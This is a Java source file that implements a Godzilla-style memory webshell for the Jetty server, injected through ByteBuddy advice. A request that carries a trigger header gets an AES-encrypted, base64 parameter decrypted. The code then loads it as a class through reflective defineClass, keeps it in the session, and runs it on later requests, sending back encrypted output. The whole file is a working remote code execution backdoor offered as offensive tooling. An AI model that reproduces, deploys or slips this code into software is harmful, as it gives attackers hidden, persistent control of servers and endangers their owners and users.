package com.reajason.javaweb.memshell.shelltool.godzilla.jetty;

import net.bytebuddy.asm.Advice;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.ByteArrayOutputStream;
import java.io.PrintWriter;
import java.lang.reflect.Method;

/**
 * @author ReaJason
 */
public class GodzillaHandlerAdvisor {

    @Advice.OnMethodEnter(skipOn = Advice.OnNonDefaultValue.class)
    public static boolean enter(
            @Advice.Argument(value = 1) Object baseRequest,
            @Advice.Argument(value = 2) Object request,
            @Advice.Argument(value = 3) Object response
    ) {
        String key = "key";
        String pass = "pass";
        String md5 = "md5";
        String headerName = "headerName";
        String headerValue = "headerValue";
        try {
            String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
            if (value != null
                    && value.contains(headerValue)) {
                baseRequest.getClass().getMethod("setHandled", boolean.class).invoke(baseRequest, true);
                String parameter = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, pass);
                byte[] data = null;
                Class<?> base64;
                try {
                    base64 = Class.forName("java.util.Base64");
                    Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
                    data = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, parameter);
                } catch (Exception var6) {
                    base64 = Class.forName("sun.misc.BASE64Decoder");
                    Object decoder = base64.newInstance();
                    data = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, parameter);
                }
                Cipher c = Cipher.getInstance("AES");
                SecretKeySpec keySpec = new SecretKeySpec(key.getBytes(), "AES");
                c.init(2, keySpec);
                data = c.doFinal(data);
                Object session = request.getClass().getMethod("getSession").invoke(request);
                Object sessionPayload = session.getClass().getMethod("getAttribute", String.class).invoke(session, "payload");
                if (sessionPayload == null) {
                    Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    defineClass.setAccessible(true);
                    Class<?> payload = (Class<?>) defineClass.invoke(Thread.currentThread().getContextClassLoader(), data, 0, data.length);
                    session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, "payload", payload);
                } else {
                    request.getClass().getMethod("setAttribute", String.class, Object.class).invoke(request, "parameters", data);
                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                    Object f = ((Class<?>) sessionPayload).newInstance();
                    f.equals(arrOut);
                    f.equals(request);
                    PrintWriter writer = (PrintWriter) response.getClass().getMethod("getWriter").invoke(response);
                    writer.write(md5.substring(0, 16));
                    f.toString();

                    c.init(1, keySpec);
                    byte[] encryptBytes = c.doFinal(arrOut.toByteArray());
                    String result = null;
                    try {
                        base64 = Class.forName("java.util.Base64");
                        Object encoder = base64.getMethod("getEncoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
                        result = (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, encryptBytes);
                    } catch (Exception var6) {
                        base64 = Class.forName("sun.misc.BASE64Encoder");
                        Object encoder = base64.newInstance();
                        result = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, encryptBytes);
                    }
                    writer.write(result);
                    writer.write(md5.substring(16));
                }
                return true;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }
}